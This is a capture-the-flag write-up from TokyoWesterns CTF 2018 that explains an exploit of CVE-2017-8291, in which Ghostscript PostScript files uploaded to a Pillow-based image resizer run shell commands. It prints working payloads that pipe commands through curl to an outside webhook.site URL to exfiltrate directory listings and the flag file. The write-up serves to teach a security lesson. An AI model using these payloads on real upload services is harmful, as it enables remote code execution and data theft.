---
title: Slack emoji converter 
contest: TokyoWesterns CTF 4th 2018
authors: trupples
layout: writeup
---

## Proof of Flag
```
TWCTF{watch_0ut_gh0stscr1pt_everywhere}
```

## Summary
Exploiting an image upload form that doesn’t check the image type by sending it
postscript “images” which execute shell commands. See CVE-2017-8291.

## Proof of solving
I’m omitting the server code here but what it does is save the image you send it
to a temporary file and attempting to resize it to max 128x128 pixels using the
python library Pillow. I initially thought it might be a race condition
vulnerability because of the `mktemp` usage. If you send the server a regular
image, say a png, jpeg, gif, etc. image, it works as expected and it sends you
back that image scaled down.

The problem is the fact that Pillow has postscript support and will try to
render a postscript “image” if sent one. I recently say this post on twitter and
it was exactly what I needed:

https://twitter.com/chaignc/status/1032253548954877954

I downloaded the server source and started a local instance to which I sent this
malicious postscript file:

```
%!PS
%%BoundingBox: 0 0 74 35

userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%notify-send “PWNED BOIII”) currentdevice putdeviceprops
showpage
```

And this popped up:

![Notification with "PWNED BOIII" content](./emoji/notif.jpg)

This is awesome! We have RCE. To send a payload we only need to replace the
command in the postscript file to something else and send it again. I quickly
set up a https://webhook.site instance and crafted this payload:

```
%!PS
%%BoundingBox: 0 0 74 35

userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%curl -X POST https://webhook.site/9ef35d63-cd74-42da-ad5c-7e1f57cd7395 -d "`ls -hal`") currentdevice putdeviceprops
showpage
```

After uploading it I received this request:

```
total 20K
drwxr-xr-x 1 root root 4.0K Sep  1 14:56 .
drwxr-xr-x 1 root root 4.0K Sep  1 14:38 ..
-rw-r--r-- 1 root root 1.1K Sep  1 14:25 app.py
drwxr-xr-x 2 root root 4.0K Sep  1 14:56 templates
-rw-r--r-- 1 root root  135 Sep  1 07:17 uwsgi.ini
```

This confirms we have RCE :D Exciting stuff! The flag wasn’t in the same
directory and it took a bit of looking around until I found where it is located.
It’s in the filesystem root directory. Here’s the listing of `/`:

```
total 76K
drwxr-xr-x   1 root root 4.0K Sep  2 07:03 .
drwxr-xr-x   1 root root 4.0K Sep  2 07:03 ..
-rwxr-xr-x   1 root root    0 Sep  2 07:03 .dockerenv
drwxr-xr-x   1 root root 4.0K Jul 17 03:15 bin
drwxr-xr-x   2 root root 4.0K Jun 26 12:03 boot
drwxr-xr-x   5 root root  360 Sep  2 07:03 dev
drwxr-xr-x   1 root root 4.0K Sep  2 07:03 etc
-rw-r--r--   1 root root   39 Sep  1 14:41 flag
drwxr-xr-x   2 root root 4.0K Jun 26 12:03 home
drwxr-xr-x   1 root root 4.0K Jul 17 03:15 lib
drwxr-xr-x   2 root root 4.0K Jul 16 00:00 lib64
drwxr-xr-x   2 root root 4.0K Jul 16 00:00 media
drwxr-xr-x   2 root root 4.0K Jul 16 00:00 mnt
drwxr-xr-x   2 root root 4.0K Jul 16 00:00 opt
dr-xr-xr-x 148 root root    0 Sep  2 07:03 proc
drwx------   1 root root 4.0K Sep  1 14:36 root
drwxr-xr-x   1 root root 4.0K Sep  2 07:03 run
drwxr-xr-x   1 root root 4.0K Jul 17 03:13 sbin
drwxr-xr-x   1 root root 4.0K Sep  1 14:38 srv
dr-xr-xr-x  12 root root    0 Sep  2 07:03 sys
drwxrwxrwt   1 root root 4.0K Sep  2 10:01 tmp
drwxr-xr-x   1 root root 4.0K Jul 16 00:00 usr
drwxr-xr-x   1 root root 4.0K Jul 16 00:00 var
```

Now let’s `cat /flag` with this final payload:

```
%!PS
%%BoundingBox: 0 0 74 35

userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%curl -X POST https://webhook.site/9ef35d63-cd74-42da-ad5c-7e1f57cd7395 -d "`cat /flag`") currentdevice putdeviceprops
showpage
```

The received flag is:
```
TWCTF{watch_0ut_gh0stscr1pt_everywhere}
```
